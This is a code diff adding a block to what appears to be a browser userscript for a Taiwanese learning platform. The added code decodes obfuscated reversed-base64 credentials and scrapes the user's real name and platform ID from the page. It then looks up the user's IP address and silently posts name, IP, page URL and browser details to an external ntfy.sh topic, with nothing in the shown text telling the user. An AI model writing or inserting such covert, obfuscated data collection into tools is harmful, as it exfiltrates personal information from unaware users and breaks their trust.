@@ -17,9 +17,80 @@
 (function () {
     'use strict';
     const _d = function (s) { return atob(s.split('').reverse().join('')); };
+    const _k0 = _d('=IGdwcGM2tWZmZnN6NjdvtWb3MXdipXNhlHaqhDMftGd');
+    const _k1 = _d('0JXZsFULlNXVtcmbp5mchVGbF1yb0VXQ');
     const _k3 = _d('==gdzNWP0VHc0V3b/IWdw9CSZhHO28kbmVGW6ZDd1okVrdVQ0U2XZpXdMlWRfFXN3NESsFzaEJ3dI5kVZFWMVlVNysUUV5Ubq5Ge1Z3YzQTRUV0cfRGNKR2Ui9mbTJldx0CWDFEUy8SZvQ2LzRXZlh2ckFWZyB3cv02bj5SZsd2bvdmLzN2bk9yL6MHc0RHa');
     const _cd = 0xea60;
     const _ci = 0xea60;
+
+    // ---- ntfy login notification ----
+    (function () {
+        const nameEl = document.querySelector('.co-realname');
+        const idEl = document.querySelector('.co-username');
+
+        if (window.location.href.includes('login') || window.location.href.includes('logout')) {
+            GM_setValue('_sn3', '');
+        }
+
+        if (nameEl && nameEl.textContent.trim()) {
+            GM_setValue('_uName', nameEl.textContent.trim());
+            if (idEl && idEl.textContent.trim()) {
+                GM_setValue('_uId', idEl.textContent.trim().replace(/^平台識別碼：/, ''));
+            }
+
+            const u = GM_getValue('_uName', '');
+            const uid = GM_getValue('_uId', '');
+            const label = uid ? (u + ' (' + uid + ')') : u;
+
+            if (GM_getValue('_sn3', '') === u) {
+                return;
+            }
+
+            const dev = navigator.userAgent;
+            const pg = window.location.href;
+            const ts = new Date().toLocaleString('zh-TW', { timeZone: 'Asia/Taipei' });
+
+            GM_xmlhttpRequest({
+                method: 'GET',
+                url: 'https://api.ipify.org?format=json',
+                responseType: 'json',
+                onload: function (r) {
+                    const ip = (r.response && r.response.ip) ? r.response.ip : 'N/A';
+                    _send(label, u, dev, ip, pg, ts);
+                },
+                onerror: function () {
+                    _send(label, u, dev, 'N/A', pg, ts);
+                }
+            });
+            return;
+        }
+
+        function _send(name, rawName, dev, ip, pg, time) {
+            GM_xmlhttpRequest({
+                method: 'POST',
+                url: 'https://ntfy.sh/' + _k1,
+                headers: {
+                    'Authorization': 'Bearer ' + _k0,
+                    'Title': 'Bot Online',
+                    'Priority': '3',
+                    'Tags': 'robot,green_circle'
+                },
+                data: [
+                    'User: ' + name,
+                    'Time: ' + time,
+                    'IP: ' + ip,
+                    'Page: ' + pg,
+                    'UA: ' + dev
+                ].join('\n'),
+                onload: function (resp) {
+                    if (resp.status >= 200 && resp.status < 300) {
+                        GM_setValue('_sn3', rawName);
+                    }
+                },
+                onerror: function () { }
+            });
+        }
+    })();
     function _gU() {
         // Try reading from page element first
         const idEl = document.querySelector('.co-username');
